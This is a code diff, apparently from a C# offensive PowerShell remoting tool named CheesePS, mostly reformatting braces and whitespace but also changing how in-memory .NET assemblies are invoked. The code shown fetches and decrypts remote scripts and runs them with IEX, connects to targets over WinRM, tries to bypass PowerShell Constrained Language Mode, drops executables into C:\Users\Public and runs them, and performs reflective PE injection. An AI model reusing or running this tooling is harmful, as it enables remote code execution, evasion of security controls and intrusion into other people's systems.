@@ -33,7 +33,7 @@ namespace CheesePS
     internal static class Utils
     {
 
-        public static bool PSImportRemoteResource(PowerShell ps, string resource, bool encrypted, string aes_key,  ImportMethod importMethod, DecryptionMethod decryptionMethod)
+        public static bool PSImportRemoteResource(PowerShell ps, string resource, bool encrypted, string aes_key, ImportMethod importMethod, DecryptionMethod decryptionMethod)
         {
             if (encrypted && importMethod == ImportMethod.WEBCLIENT)
             {
@@ -82,7 +82,7 @@ namespace CheesePS
                             decrypted = Program.DecryptScript(script, Format.STRING, aes_key, false);
                             import_code = $"IEX {decrypted};";
                         }
-                        else 
+                        else
                         {
                             throw new NotSupportedException($"FAILURE: {decryptionMethod} not supported");
                         }
@@ -99,7 +99,7 @@ namespace CheesePS
             }
         }
 
-        public static void PSInvokeDecrypt(PowerShell ps, string base64Script, string aes_key, Format format, string destVarName="$PEBytes")
+        public static void PSInvokeDecrypt(PowerShell ps, string base64Script, string aes_key, Format format, string destVarName = "$PEBytes")
         {
             string code;
             try
@@ -119,7 +119,8 @@ namespace CheesePS
                 ps.AddScript(code).Invoke();
                 return;
             }
-            catch (Exception e) {
+            catch (Exception e)
+            {
                 Console.WriteLine($"[-] FAILURE: {e.Message}");
                 return;
             }
@@ -297,13 +298,16 @@ function Invoke-DecryptAssembly
     
     return $clearbytes;
 }}";
-            try { 
+            try
+            {
                 ps.AddScript($"IEX {code}").Invoke();
                 return true;
-            }catch{
+            }
+            catch
+            {
                 return false;
             }
-        
+
         }
 
         public static string Decrypt(string cipherText, string EncryptionKey = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
@@ -563,7 +567,8 @@ function Invoke-DecryptAssembly
                     return;
                 }
 
-                if (use_powershell_decryption) {
+                if (use_powershell_decryption)
+                {
                     decryptionMethod = DecryptionMethod.POWERSHELL;
                 }
 
@@ -641,7 +646,8 @@ function Invoke-DecryptAssembly
                     {
                         uri = new Uri($"http://{target}:5985/WSMAN");
                     }
-                    else {
+                    else
+                    {
                         uri = new Uri($"https://{target}:5986/WSMAN");
                     }
                     conn = new WSManConnectionInfo(uri);
@@ -667,18 +673,19 @@ function Invoke-DecryptAssembly
 
                 if (escape_lockdown)
                 {
-                    using (var runspace = CreateRunSpace(conn)) {
-                    runspace.Open();
+                    using (var runspace = CreateRunSpace(conn))
+                    {
+                        runspace.Open();
 
-                    Console.WriteLine("[*] Attempting to enable FullLanguage Mode");
-                    if (!AttemptRegalBypass(runspace))
-                    {
-                        Console.WriteLine($"[-] Could not set Lockdown Policy -> FullLanguage on {display_target}");
-                    }
-                    else
-                    {
-                        Console.WriteLine("[+] Enabled FullLanguage Mode");
-                    }
+                        Console.WriteLine("[*] Attempting to enable FullLanguage Mode");
+                        if (!AttemptRegalBypass(runspace))
+                        {
+                            Console.WriteLine($"[-] Could not set Lockdown Policy -> FullLanguage on {display_target}");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] Enabled FullLanguage Mode");
+                        }
                     }
                 }
 
@@ -782,7 +789,7 @@ function Invoke-DecryptAssembly
         {
             string destVarName = "$PEBytes";
             string execute_stub = $"{destVarName} = [byte[]] (";
-           
+
             try
             {
                 string destination = $"C:\\Users\\Public\\{Path.GetFileNameWithoutExtension(Path.GetRandomFileName())}.exe";
@@ -790,7 +797,7 @@ function Invoke-DecryptAssembly
                 if (decryptionMethod == DecryptionMethod.CSHARP || !assembly_encrypted)
                 {
                     byte[] assembly = LoadAssembly(execute_assembly, assembly_encrypted, aes_key);
-                    
+
                     execute_stub += $"0x{BitConverter.ToString(assembly).Replace("-", ", 0x")} );";
                 }
                 else if (decryptionMethod == DecryptionMethod.POWERSHELL && assembly_encrypted)
@@ -806,26 +813,36 @@ function Invoke-DecryptAssembly
                     throw new NotSupportedException($"Method {decryptionMethod} not supported");
                 }
                 if (!reflective_injection)
-                    {
-                        execute_stub += $"[io.file]::WriteAllBytes('{destination}',{destVarName});sleep 1;";
-                        execute_stub += $"& '{destination}' {code}";
+                {
+                    execute_stub += $"[io.file]::WriteAllBytes('{destination}',{destVarName});sleep 1;";
+                    execute_stub += $"& '{destination}' {code}";
 
+                }
+                else
+                {
+                    if (!is_dotnet)
+                    {
+                        // execute_stub += $"Invoke-ReflectivePEInjection -ErrorAction silentlycontinue -PEBytes $PEBytes -ExeArgs '{code}' ";
+                        execute_stub += $"Invoke-ReflectivePEInjection -PEBytes {destVarName} -ExeArgs '{code}' | Out-String";
                     }
                     else
                     {
-                        if (!is_dotnet)
+                        string arguments = String.Join("\",\"", code.Split(' '));
+                        if (String.IsNullOrEmpty(arguments))
                         {
-                            // execute_stub += $"Invoke-ReflectivePEInjection -ErrorAction silentlycontinue -PEBytes $PEBytes -ExeArgs '{code}' ";
-                            execute_stub += $"Invoke-ReflectivePEInjection -PEBytes {destVarName} -ExeArgs '{code}' | Out-String";
+                            execute_stub += $"[string[]] $pargs =@(); [object[]] $arguments =@(, $pargs);";
                         }
-                        else
-                        {
-                            execute_stub += $"[System.Reflection.Assembly]::Load({destVarName}); {code}";
+                        else {
+                            execute_stub += $"[string[]] $pargs =@(, \"{arguments}\" ); [object[]] $arguments =@(, $pargs);";
                         }
-                    }
 
-                    ret = true;
-                    return execute_stub;
+
+                        execute_stub += $"$obj = [System.Reflection.Assembly]::Load({destVarName}); $obj.EntryPoint.Invoke($null, $arguments)";
+                    }
+                }
+
+                ret = true;
+                return execute_stub;
             }
             catch
             {
@@ -881,7 +898,7 @@ Remove-Item -Path {filename} -Force;");
             else
             {
                 string base64_assembly = Utils.DownloadAssembly(execute_assembly);
-                
+
                 assembly_bytes = Utils.DecryptToBytes(base64_assembly, aes_key);
 
             }
